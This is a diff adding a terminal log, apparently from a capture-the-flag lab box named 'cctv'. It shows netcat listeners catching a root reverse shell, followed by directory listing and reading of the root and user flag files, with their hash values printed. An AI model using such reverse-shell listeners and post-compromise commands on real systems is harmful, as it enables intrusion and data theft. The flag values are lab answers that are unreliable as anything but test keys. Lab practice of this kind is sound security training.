@@ -1,0 +1,62 @@
+                                                                                                                                                                                                                                            
+[15:27:23] rf2i@kali (10.10.15.67) [10.129.231.149]:~$ nc -lvnp 4444
+listening on [any] 4444 ...
+^C
+[15:33:57] rf2i@kali (10.10.15.67) [10.129.231.149]:~$ nc -lvnp 4444
+listening on [any] 4444 ...
+^C
+[16:00:05] rf2i@kali (10.10.15.67) [10.129.231.149]:~$ nc -lvnp 4444
+listening on [any] 4444 ...
+
+^C
+[16:04:16] rf2i@kali (10.10.15.67) [10.129.231.149]:~$ nc -lvnp 1234
+listening on [any] 1234 ...
+^C
+[16:04:22] rf2i@kali (10.10.15.67) [10.129.231.149]:~$ nc -lvnp 1235
+listening on [any] 1235 ...
+ ^C
+[16:06:56] rf2i@kali (10.10.15.67) [10.129.231.149]:~$ nc -lvnp 1235
+listening on [any] 1235 ...
+^C
+[16:06:59] rf2i@kali (10.10.15.67) [10.129.231.149]:~$ nc -lvnp 1235
+listening on [any] 1235 ...
+connect to [10.10.15.67] from (UNKNOWN) [10.129.7.12] 57192
+bash: cannot set terminal process group (145636): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cctv:/etc/motioneye# ls
+ls
+camera-1.conf
+motion.conf
+motioneye.conf
+root@cctv:/etc/motioneye# whoami 
+whoami 
+root
+root@cctv:/etc/motioneye# cd /root
+cd /root
+root@cctv:~# ls
+ls
+clean_logs.sh
+docker-binaries
+files
+root.txt
+snap
+root@cctv:~# cat root.txt
+cat root.txt
+82e8401d1523a44effdef8042a7cf3de
+root@cctv:~# ls /home   
+ls /home
+mark
+sa_mark
+root@cctv:~# cat /hom/sa_mark/user.txt
+cat /hom/sa_mark/user.txt
+cat: /hom/sa_mark/user.txt: No such file or directory
+root@cctv:~# ls /home/sa_mark
+ls /home/sa_mark
+SecureVision Staff Announcement.pdf
+user.txt
+root@cctv:~# cd /home/sa_mark
+cd /home/sa_mark
+root@cctv:/home/sa_mark# cat user.txt
+cat user.txt
+6336368c7ec3340bbdd46a26d76ec250
+root@cctv:/home/sa_mark# 
